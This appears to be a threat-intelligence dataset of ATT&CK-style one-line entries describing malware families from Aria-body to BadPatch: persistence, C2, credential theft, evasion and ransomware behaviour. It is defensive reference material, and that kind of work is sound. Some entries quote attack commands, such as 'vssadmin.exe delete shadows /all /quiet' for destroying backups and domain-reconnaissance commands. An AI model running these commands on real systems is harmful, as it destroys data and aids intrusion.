Aria-body has used an encrypted configuration file for its loader.
Aria-body has the ability to delete files and directories on compromised hosts.
Aria-body has the ability to gather metadata from a file and to search for file and directory names.
Aria-body has the ability to download additional payloads from C2.
Aria-body has the ability to launch files using &lt;code&gt;ShellExecute&lt;/code&gt;.
Aria-body has used TCP in C2 communications.
Aria-body has the ability to enumerate loaded modules for a process..
Aria-body has the ability to use a reverse SOCKS proxy module.
Aria-body has established persistence via the Startup folder or Run Registry key.
Aria-body has the ability to capture screenshots on compromised hosts.
Aria-body has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.
Aria-body has the ability to identify the location, public IP address, and domain name on a compromised host.
Aria-body has the ability to gather TCP and UDP table status listings.
Aria-body has the ability to identify the username on a compromised host.
Aria-body has the ability to duplicate a token from ntprint.exe.
Aria-body has used HTTP in C2 communications.
Arp can be used to display a host's ARP cache, which may include address resolutions for remote systems.
Arp can be used to display ARP configuration information on the host.
Astaroth collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries.
Astaroth has obfuscated and randomized parts of the JScript code it is initiating.
Astaroth uses ActiveX objects for file execution and manipulation.
Astaroth uses an external software known as NetPass to recover passwords.
Astaroth can launch itself via DLL Search Order Hijacking.
Astaroth can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.
Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code.
Astaroth has used a DGA in C2 communications.
Astaroth has used an XOR-based algorithm to encrypt payloads twice with different keys.
Astaroth exfiltrates collected information from its r1.log file to the external C2 server.
Astaroth loads its module with the XSL script parameter &lt;code&gt;vShow&lt;/code&gt; set to zero, which opens the application with a hidden window.
Astaroth uses certutil and BITSAdmin to download additional malware.
Astaroth uses JavaScript to perform its core functionalities.
Astaroth logs keystrokes from the victim's machine.
Astaroth collects data in a plaintext file named r1.log before exfiltration.
Astaroth has used malicious files including VBS, LNK, and HTML for execution.
Astaroth can abuse alternate data streams (ADS) to store content for malicious payloads.
Astaroth searches for different processes on the system.
Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.
Astaroth creates a startup item for persistence.
Astaroth can be loaded through regsvr32.exe.
Astaroth checks for the presence of Avast antivirus in the &lt;code&gt;C:\Program\Files\&lt;/code&gt; folder.
Astaroth uses the LoadLibraryExW() function to load additional modules.
Astaroth's initial payload is a malicious .LNK file.
Astaroth uses a software packer called Pe123\RPolyCryptor.
Astaroth has been delivered via malicious e-mail attachments.
Astaroth encodes data using Base64 before sending it to the C2 server.
Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.
Astaroth collects the machine name and keyboard language from the system.
Astaroth collects the external IP address from the system.
Astaroth collects the timestamp from the infected machine.
Astaroth uses an external software known as NetPass to recover passwords.
Astaroth has used malicious VBS e-mail attachments for execution.
Astaroth spawns a CMD process to execute commands.
Astaroth uses WMIC to execute payloads.
Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.
AsyncRAT can use the `CheckRemoteDebuggerPresent` function to detect the presence of a debugger.
AsyncRAT can be configured to use dynamic DNS.
AsyncRAT can hide the execution of scheduled tasks using `ProcessWindowStyle.Hidden`.
AsyncRAT has the ability to download files over SFTP.
AsyncRAT can capture keystrokes on the victim’s machine.
AsyncRAT has the ability to use OS APIs including `CheckRemoteDebuggerPresent`.
AsyncRAT can examine running processes to determine if a debugger is present.
AsyncRAT can create a scheduled task to maintain persistence on system start-up.
AsyncRAT has the ability to view the screen on compromised hosts.
AsyncRAT can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.
AsyncRAT can check the disk size through the values obtained with `DeviceInfo.`
AsyncRAT can check if the current user of a compromised system is an administrator.
AsyncRAT can record screen content on targeted systems.
Attor can obtain application window titles and then determines which windows to perform Screen Capture on.
Attor encrypts collected data with a custom implementation of Blowfish and RSA ciphers.
Attor's Blowfish key is encrypted with a public RSA key.
Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API.
Attor's has a plugin that is capable of recording audio using available input sound devices.
Attor has automatically collected data about the compromised system.
Attor has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.
Attor has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.
Strings in Attor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.
Attor has exfiltrated data over the C2 channel.
Attor’s plugin deletes the collected files and log files after exfiltration.
Attor has used FTP protocol for C2 communication.
Attor has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.
Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.
Attor can download additional plugins, updates and other files.
One of Attor's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.
Attor has staged collected data in a central upload directory prior to exfiltration.
Attor's dispatcher can establish persistence via adding a Registry key with a logon script &lt;code&gt;HKEY_CURRENT_USER\Environment "UserInitMprLogonScript" &lt;/code&gt;.
Attor's dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).
Attor's dispatcher can modify the Run registry key.
Attor has used Tor for C2 communication.
Attor's dispatcher has used CreateProcessW API for execution.
Attor has a plugin that collects information about inserted storage devices, modems, and phone devices.
Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.
Attor has opened the registry and performed query searches.
Attor's installer plugin can schedule rundll32.exe to load the dispatcher.
Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon.
Attor's has a plugin that captures screenshots of the target applications.
Attor's dispatcher can be executed as a service.
Attor's dispatcher can execute additional plugins by loading the respective DLLs.
Attor has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.
Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.
Attor monitors the free disk space on the system.
Attor has manipulated the time of last access to files and registry keys after they have been created or modified.
Attor's dispatcher can establish persistence by registering a new service.
AuTo Stealer can collect data such as PowerPoint files, Word documents, Excel files, PDF files, text files, database files, and image files from an infected machine.
AuTo Stealer can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.
AuTo Stealer can store collected data from an infected host to a file named `Hostname_UserName.txt` prior to exfiltration.
AuTo Stealer can use TCP to communicate with command and control servers.
AuTo Stealer can place malicious executables in a victim's AutoRun registry key or StartUp directory, depending on the AV product installed, to maintain persistence.
AuTo Stealer has the ability to collect information about installed AV products from an infected host.
AuTo Stealer has the ability to collect the hostname and OS information from an infected host.
AuTo Stealer has the ability to collect the username from an infected host.
AuTo Stealer can use HTTP to communicate with its C2 servers.
AuTo Stealer can use `cmd.exe` to execute a created batch file.
AuditCred uses XOR and RC4 to perform decryption on the code functions.
AuditCred encrypts the configuration.
AuditCred can delete files from the system.
AuditCred can search through folders and files on the system.
AuditCred can download files and additional malware.
AuditCred can inject code from files to other running processes.
AuditCred can utilize proxy for communications.
AuditCred can open a reverse shell on the system to execute commands.
AuditCred is installed as a new service on the system.
AutoIt backdoor attempts to escalate privileges by bypassing User Access Control.
AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.
AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader.
AutoIt backdoor has sent a C2 response that was base64-encoded.
Avaddon bypasses UAC using the CMSTPLUA COM interface.
Avaddon encrypts the victim system using a combination of AES256 and RSA encryption schemes.
Avaddon has decrypted encrypted strings.
Avaddon looks for and attempts to stop anti-malware solutions.
Avaddon has searched for specific files prior to encryption.
Avaddon deletes backups and shadow copies using native system tools.
Avaddon has been executed through a malicious JScript downloader.
Avaddon modifies several registry keys for persistence and UAC bypass.
Avaddon has used the Windows Crypto API to generate an AES key.
Avaddon has enumerated shared folders and mapped volumes.
Avaddon has used encrypted strings.
Avaddon has collected information about running processes.
Avaddon uses registry run keys for persistence.
Avaddon looks for and attempts to stop database processes.
Avaddon checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.
Avaddon can collect the external IP address of the victim.
Avaddon uses wmic.exe to delete shadow copies.
Avenger has the ability to decrypt files downloaded from C2.
Avenger has the ability to XOR encrypt files to be sent to C2.
Avenger has the ability to browse files in directories such as Program Files and the Desktop.
Avenger has the ability to download files from C2 to a compromised host.
Avenger has the ability to use Tasklist to identify running processes.
Avenger has the ability to inject shellcode into svchost.exe.
Avenger has the ability to identify installed anti-virus products on a compromised host.
Avenger can extract backdoor malware from downloaded images.
Avenger has the ability to identify the host volume ID and the OS architecture on a compromised host.
Avenger can identify the domain of the compromised host.
Avenger has the ability to use HTTP in communication with C2.
AvosLocker has encrypted files and network resources using AES-256 and added an `.avos`, `.avos2`, or `.AvosLinux` extension to filenames.
AvosLocker has deobfuscated XOR-encoded strings.
AvosLocker has used obfuscated API calls that are retrieved by their checksums.
AvosLocker has searched for files and directories on a compromised network.
AvosLocker has hidden its console window by using the `ShowWindow` API function.
AvosLocker has been disguised as a .jpg file.
AvosLocker has used a variety of Windows API calls, including `NtCurrentPeb` and `GetLogicalDrives`.
AvosLocker has enumerated shared drives on a compromised network.
AvosLocker has used XOR-encoded strings.
AvosLocker has discovered system processes by calling `RmGetList`.
AvosLocker has been executed via the `RunOnce` Registry key to run itself on safe mode.
AvosLocker can restart a compromised machine in safe mode.
AvosLocker has terminated specific processes before encryption.
AvosLocker’s Linux variant has terminated ESXi virtual machines.
AvosLocker has checked the system time before and after encryption.
Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.
Azorult can steal credentials in files belonging to common software such as Skype, Telegram, and Steam.
Azorult can steal credentials from the victim's browser.
Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.
Azorult can delete files from victim machines.
Azorult can recursively search for files in folders and collects files from the desktop with certain extensions.
Azorult can download and execute additional files. Azorult has also downloaded a ransomware payload called Hermes.
Azorult can collect a list of running processes by calling CreateToolhelp32Snapshot.
Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.
Azorult can check for installed software on the system under the Registry key &lt;code&gt;Software\Microsoft\Windows\CurrentVersion\Uninstall&lt;/code&gt;.
Azorult can capture screenshots of the victim’s machines.
Azorult can encrypt C2 traffic using XOR.
Azorult can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.
Azorult can collect host IP information from the victim’s machine.
Azorult can collect the username from the victim’s machine.
Azorult can collect the time zone information from the system.
The "ZR" variant of BACKSPACE will check to see if known host-based firewalls are installed on the infected systems. BACKSPACE will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.
Adversaries can direct BACKSPACE to upload files to the C2 Server.
BACKSPACE allows adversaries to search for files.
The "ZJ" variant of BACKSPACE allows "ZJ link" infections with Internet access to relay traffic from "ZJ listen" to a command server.
BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.
BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs "louder" interactions with the malware.
Newer variants of BACKSPACE will encode C2 communications with a custom system.
BACKSPACE may collect information about running processes.
BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.
BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.
BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.
During its initial execution, BACKSPACE extracts operating system information from the infected host.
BACKSPACE uses HTTP as a transport to communicate with its command server.
Adversaries can direct BACKSPACE to execute from the command line on infected hosts, or have BACKSPACE create a reverse shell.
BADCALL disables the Windows firewall before binding to a port.
BADCALL modifies the firewall Registry key &lt;code&gt;SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List&lt;/code&gt;.
BADCALL communicates on ports 443 and 8000 with a FakeTLS method.
BADCALL uses a FakeTLS method during C2.
BADCALL functions as a proxy server between the victim and C2 server.
BADCALL encrypts C2 traffic using an XOR/ADD cipher.
BADCALL collects the computer name and host name on the compromised system.
BADCALL collects the network adapter information.
BADFLICK has compressed data using the aPLib compression library.
BADFLICK has uploaded files from victims' machines.
BADFLICK can decode shellcode using a custom rotating XOR cipher.
BADFLICK has searched for files on the infected host.
BADFLICK has download files from its C2 server.
BADFLICK has relied upon users clicking on a malicious attachment delivered through spearphishing.
BADFLICK has been distributed via spearphishing campaigns containing malicious Microsoft Word documents.
BADFLICK has captured victim computer name, memory space, and CPU details.
BADFLICK has captured victim IP address details.
BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes.
BADHATCH can beacon to a hardcoded C2 IP address using TLS encryption every 5 minutes.
BADHATCH can inject itself into a new `svchost.exe -k netsvcs` process using the asynchronous procedure call (APC) queue.
BADHATCH can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC.
BADHATCH malicious PowerShell commands can be encoded with base64.
BADHATCH can use `net.exe group "domain admins" /domain` to identify Domain Administrators.
BADHATCH can use `nltest.exe /domain_trusts` to discover domain trust relationships on a compromised machine.
BADHATCH has the ability to execute a malicious DLL by injecting into `explorer.exe` on a compromised machine.
BADHATCH has an embedded second stage DLL payload within the first stage of the malware.
BADHATCH can be compressed with the ApLib algorithm.
BADHATCH can exfiltrate data over the C2 channel.
BADHATCH has the ability to delete PowerShell scripts from a compromised machine.
BADHATCH can emulate an FTP server to connect to actor-controlled C2 servers.
BADHATCH has the ability to load a second stage malicious DLL file onto a compromised machine.
BADHATCH can utilize Native API functions such as, `ToolHelp32` and `Rt1AdjustPrivilege` to enable `SeDebugPrivilege` on a compromised machine.
BADHATCH can check for open ports on a computer by establishing a TCP connection.
BADHATCH can check a user's access to the C$ share on a compromised machine.
BADHATCH can perform pass the hash on compromised machines with x64 versions.
BADHATCH can utilize `powershell.exe` to execute commands on a compromised host.
BADHATCH can retrieve a list of running processes from a compromised machine.
BADHATCH can inject itself into an existing explorer.exe process by using `RtlCreateUserThread`.
BADHATCH can use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers. BADHATCH can also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers.
BADHATCH can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to `CreateThread`.
BADHATCH can use a PowerShell object such as, `System.Net.NetworkInformation.Ping` to ping a computer.
BADHATCH can use `schtasks.exe` to gain persistence.
BADHATCH can take screenshots and send them to an actor-controlled C2 server.
BADHATCH can obtain current system information from a compromised machine such as the `SHELL PID`, `PSVERSION`, `HOSTNAME`, `LOGONSERVER`, `LASTBOOTUP`, drive information, OS type/version, bitness, and hostname.
BADHATCH can execute `netstat.exe -f` on a compromised machine.
BADHATCH can obtain logged user information from a compromised machine and can execute the command `whoami.exe`.
BADHATCH can obtain the `DATETIME` and `UPTIME` from a compromised machine.
BADHATCH can impersonate a `lsass.exe` or `vmtoolsd.exe` token.
BADHATCH can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers.
BADHATCH can be utilized to abuse `sslip.io`, a free IP to domain mapping service, as part of actor-controlled C2 channels.
BADHATCH can use `cmd.exe` to execute commands on a compromised host.
BADHATCH can utilize WMI to collect system information, create new processes, and run malicious PowerShell scripts on a compromised machine.
BADHATCH can use WMI event subscriptions for persistence.
BADNEWS monitors USB devices and copies files with certain extensions to a predefined directory.
BADNEWS can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.
BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable.
After encrypting C2 data, BADNEWS converts it into a hexadecimal representation and then encodes it into base64.
When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.
When it first starts, BADNEWS crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.
BADNEWS copies files with certain extensions from USB devices to
a predefined directory.
BADNEWS collects C2 information via a dead drop resolver.
BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.
BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself.
BADNEWS is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.
When it first starts, BADNEWS spawns a new thread to log keystrokes.
BADNEWS copies documents under 15MB found on the victim system to is the user's &lt;code&gt;%temp%\SMB\&lt;/code&gt; folder. It also copies files from USB devices to a predefined directory.
BADNEWS attempts to hide its payloads using legitimate filenames.
BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.
BADNEWS checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.
BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.
BADNEWS installs a registry Run key to establish persistence.
BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute.
BADNEWS has a command to take a screenshot and send it to the C2 server.
BADNEWS encodes C2 traffic with base64.
BADNEWS encrypts C2 data with a ROR by 3 and an XOR by 0x23.
BADNEWS establishes a backdoor over HTTP.
BADNEWS is capable of executing commands via cmd.exe.
BBK has the ability to decrypt AES encrypted payloads.
BBK has the ability to download files from C2 to the infected host.
BBK has the ability to use the &lt;code&gt;CreatePipe&lt;/code&gt; API to add a sub-process for execution via cmd.
BBK has the ability to inject shellcode into svchost.exe.
BBK can extract a malicious Portable Executable (PE) from a photo.
BBK has the ability to use HTTP in communications with C2.
BBK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.
BBSRAT can compress data with ZLIB prior to sending it back to the C2 server.
BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList &lt;code&gt;{42aedc87-2188-41fd-b9a3-0c966feabec1}&lt;/code&gt; or Microsoft WBEM New Event Subsystem &lt;code&gt;{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}&lt;/code&gt; depending on the system's CPU architecture.
DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper.
BBSRAT uses Expand to decompress a CAB file into executable content.
BBSRAT can delete files and directories.
BBSRAT can list file and directory information.
BBSRAT can list running processes.
BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.
BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe&lt;/code&gt;.
BBSRAT can start, stop, or delete services.
BBSRAT uses a custom encryption algorithm on data sent back to the C2 server over HTTP.
BBSRAT can query service configuration information.
BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.
BBSRAT can modify service configurations.
BISCUIT uses SSL for encrypting C2 communications.
BISCUIT malware contains a secondary fallback command and control server that is contacted after the primary command and control server.
BISCUIT has a command to download a file from the C2 server.
BISCUIT can capture keystrokes.
BISCUIT has a command to enumerate running processes and identify their owners.
BISCUIT has a command to periodically take screenshots of the system.
BISCUIT has a command to collect the processor type, operation system, computer name, and whether the system is a laptop or PC.
BISCUIT has a command to gather the username from the system.
BISCUIT has a command to collect the system `UPTIME`.
BISCUIT has a command to launch a command shell on the system.
BITSAdmin can be used to create BITS Jobs to launch a malicious process.
BITSAdmin can be used to create BITS Jobs to upload files from a compromised host.
BITSAdmin can be used to create BITS Jobs to upload and/or download files.
BITSAdmin can be used to create BITS Jobs to upload and/or download files from SMB file servers.
BLACKCOFFEE has also obfuscated its C2 traffic as normal traffic to sites such as Github.
BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.
BLACKCOFFEE has the capability to delete files.
BLACKCOFFEE has the capability to enumerate files.
BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.
BLACKCOFFEE has the capability to discover processes.
BLACKCOFFEE has the capability to create a reverse shell.
BLINDINGCAN has been signed with code-signing certificates such as CodeRipper.
BLINDINGCAN has uploaded files from victim machines.
BLINDINGCAN has used AES and XOR to decrypt its DLLs.
BLINDINGCAN has obfuscated code using Base64 encoding.
BLINDINGCAN has sent user and system information to a C2 server via HTTP POST requests.
BLINDINGCAN has deleted itself and associated artifacts from victim machines.
BLINDINGCAN can search, read, write, move, and execute files.
BLINDINGCAN has downloaded files to a victim machine.
BLINDINGCAN has lured victims into executing malicious macros embedded within Microsoft Office documents.
BLINDINGCAN has attempted to hide its payload by using legitimate file names such as "iconcache.db".
BLINDINGCAN has used Rundll32 to load a malicious DLL.
BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine.
BLINDINGCAN has been packed with the UPX packer.
BLINDINGCAN has been delivered by phishing emails containing malicious Microsoft Office documents.
BLINDINGCAN has encoded its C2 traffic with Base64.
BLINDINGCAN has encrypted its C2 traffic with RC4.
BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.
BLINDINGCAN has collected the victim machine's local IP address information and MAC address.
BLINDINGCAN has modified file and directory timestamps.
BLINDINGCAN has used HTTPS over port 443 for command and control.
BLINDINGCAN has executed commands via cmd.exe.
BLUELIGHT can zip files before exfiltration.
BLUELIGHT has encoded data into a binary blob using XOR.
BLUELIGHT can use different cloud providers for its C2.
BLUELIGHT can collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale.
BLUELIGHT has a XOR-encoded payload.
BLUELIGHT has exfiltrated data over its C2 channel.
BLUELIGHT can uninstall itself.
BLUELIGHT can enumerate files and collect associated metadata.
BLUELIGHT can download additional files onto the host.
BLUELIGHT can collect process filenames and SID authority level.
BLUELIGHT has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.
BLUELIGHT can collect a list of anti-virus products installed on a machine.
BLUELIGHT can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.
BLUELIGHT can check to see if the infected machine has VM tools running.
BLUELIGHT has collected the computer name and OS version from victim machines.
BLUELIGHT can collect IP information from the victim’s machine.
BLUELIGHT can collect the username on a compromised host.
BLUELIGHT can collect the local time on a compromised host.
BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API.
BONDUPDATER can use DNS and TXT records within its DNS tunneling protocol for command and control.
BONDUPDATER uses a DGA to communicate with command and control servers.
BONDUPDATER uses &lt;code&gt;-windowstyle hidden&lt;/code&gt; to conceal a PowerShell window that downloads a payload.
BONDUPDATER can download or upload files from its C2 server.
BONDUPDATER is written in PowerShell.
BONDUPDATER persists using a scheduled task that executes every minute.
BONDUPDATER can read batch commands in a file sent from its C2 server and execute them with cmd.exe.
BOOSTWRITE has been signed by a valid CA.
BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.
BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload.
BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.
BOOSTWRITE has used the DWriteCreateFactory() function to load additional modules.
BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.
BOOTRASH has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.
BS2005 uses Base64 encoding for communication in the message body of an HTTP request.
BUBBLEWRAP can communicate using SOCKS.
BUBBLEWRAP collects system information, including the operating system version and hostname.
BUBBLEWRAP can communicate using HTTP or HTTPS.
BUSHWALK can embed into the legitimate `querymanifest.cgi` file on compromised Ivanti Connect Secure VPNs.
BUSHWALK can Base64 decode and RC4 decrypt malicious payloads sent through a web request’s command parameter.
BUSHWALK can write malicious payloads sent through a web request’s command parameter.
BUSHWALK can encrypt the resulting data generated from C2 commands with RC4.
BUSHWALK can modify the `DSUserAgentCap.pm` Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests.
BUSHWALK is a web shell that has the ability to execute arbitrary commands or write files.
Babuk can use ChaCha8 and ECDH to encrypt data.
Babuk has the ability to unpack itself into memory using XOR.
Babuk can stop anti-virus services on a compromised host.
Babuk has the ability to enumerate files on a targeted system.
Babuk has the ability to delete shadow volumes using &lt;code&gt;vssadmin.exe delete shadows /all /quiet&lt;/code&gt;.
Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution.
Babuk has the ability to enumerate network shares.
Babuk has the ability to check running processes on a targeted system.
Babuk can stop specific services related to backups.
Versions of Babuk have been packed.
Babuk can enumerate disk volumes, get disk information, and query service status.
Babuk can use “WNetOpenEnumW” and “WNetEnumResourceW” to enumerate files in network resources for encryption.
Babuk can enumerate all services running on a compromised host.
Babuk has the ability to use the command line to control execution on compromised hosts.
BabyShark has the ability to decode downloaded files prior to execution.
BabyShark has cleaned up all files associated with the secondary payload execution.
BabyShark has used &lt;code&gt;dir&lt;/code&gt; to search for "programfiles" and "appdata".
BabyShark has downloaded additional files from the C2.
BabyShark has a PowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger.
BabyShark has used mshta.exe to download and execute applications from a remote server.
BabyShark has executed the &lt;code&gt;tasklist&lt;/code&gt; command.
BabyShark has executed the &lt;code&gt;reg query&lt;/code&gt; command for &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&lt;/code&gt;.
BabyShark has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.
BabyShark has used scheduled tasks to maintain persistence.
BabyShark has encoded data using certutil before exfiltration.
BabyShark has executed the &lt;code&gt;ver&lt;/code&gt; command.
BabyShark has executed the &lt;code&gt;ipconfig /all&lt;/code&gt; command.
BabyShark has executed the &lt;code&gt;whoami&lt;/code&gt; command.
BabyShark has used cmd.exe to execute commands.
BackConfig has been signed with self signed digital certificates mimicking a legitimate software company.
BackConfig has used compressed and decimal encoded VBS scripts.
BackConfig has used a custom routine to decrypt strings.
BackConfig has the ability to remove files and folders related to previous infections.
BackConfig has the ability to identify folders and files related to previous infections.
BackConfig has the ability to set folders or files to be hidden from the Windows Explorer default view.
BackConfig can download and execute additional payloads on a compromised host.
BackConfig has compromised victims via links to URLs hosting malicious content.
BackConfig has hidden malicious payloads in &lt;code&gt;%USERPROFILE%\Adobe\Driver\dwg\&lt;/code&gt; and mimicked the legitimate DHCP service binary.
BackConfig can leverage API functions such as &lt;code&gt;ShellExecuteA&lt;/code&gt; and &lt;code&gt;HttpOpenRequestA&lt;/code&gt; in the process of downloading and executing files.
BackConfig has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.
BackConfig has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.
BackConfig has the ability to gather the victim's computer name.
BackConfig has used VBS to install its downloader component and malicious documents with VBA macro code.
BackConfig has the ability to use HTTPS for C2 communiations.
BackConfig can download and run batch files to execute commands on a compromised host.
Backdoor.Oldrea writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.
Some Backdoor.Oldrea samples contain a publicly available Web browser password recovery tool.
Backdoor.Oldrea collects address book information from Outlook.
Backdoor.Oldrea contains a cleanup module that removes traces of itself from the victim.
Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.
Backdoor.Oldrea can download additional modules from C2.
Backdoor.Oldrea can use a network scanning module to identify ICS-related ports.
Backdoor.Oldrea collects information about running processes.
Backdoor.Oldrea injects itself into explorer.exe.
Backdoor.Oldrea adds Registry Run keys to achieve persistence.
Backdoor.Oldrea can enumerate and map ICS-specific systems in victim environments.
Backdoor.Oldrea can use rundll32 for execution on compromised hosts.
Some Backdoor.Oldrea samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.
Backdoor.Oldrea collects information about the OS and computer name.
Backdoor.Oldrea collects information about the Internet adapter configuration.
Backdoor.Oldrea collects the current username from the victim.
Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges.
Bad Rabbit has encrypted files and disks using AES-128-CBC and RSA-2048.
Bad Rabbit spread through watering holes on popular sites by injecting JavaScript into the HTML body or a &lt;code&gt;.js&lt;/code&gt; file.
Bad Rabbit used the EternalRomance SMB exploit to spread through victim networks.
Bad Rabbit has used an executable that installs a modified bootloader to prevent normal boot-up.
Bad Rabbit has used Mimikatz to harvest credentials from the victim's machine.
Bad Rabbit has been executed through user installation of an executable disguised as a flash installer.
Bad Rabbit has masqueraded as a Flash Player installer through the executable file &lt;code&gt;install_flash_player.exe&lt;/code&gt;.
Bad Rabbit has used various Windows API calls.
Bad Rabbit enumerates open SMB shares on internal victim networks.
Bad Rabbit’s &lt;code&gt;infpub.dat&lt;/code&gt; file uses NTLM login credentials to brute force Windows machines.
Bad Rabbit can enumerate all running processes to compare hashes.
Bad Rabbit has used rundll32 to launch a malicious DLL as &lt;code&gt;C:Windowsinfpub.dat&lt;/code&gt;.
Bad Rabbit’s &lt;code&gt;infpub.dat&lt;/code&gt; file creates a scheduled task to launch a malicious executable.
Bad Rabbit drops a file named &lt;code&gt;infpub.dat&lt;/code&gt;into the Windows directory and is executed through SCManager and &lt;code&gt;rundll.exe&lt;/code&gt;.
BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.
BadPatch searches for files with specific file extensions.
BadPatch can download and execute or update malware.
BadPatch has a keylogging capability.
BadPatch stores collected data in log files before exfiltration.
BadPatch uses SMTP for C2.
BadPatch establishes a foothold by adding a link to the malware executable in the startup folder.
BadPatch captures screenshots in .jpg format and then exfiltrates them.
BadPatch uses WMI to enumerate installed security products in the victim’s environment.
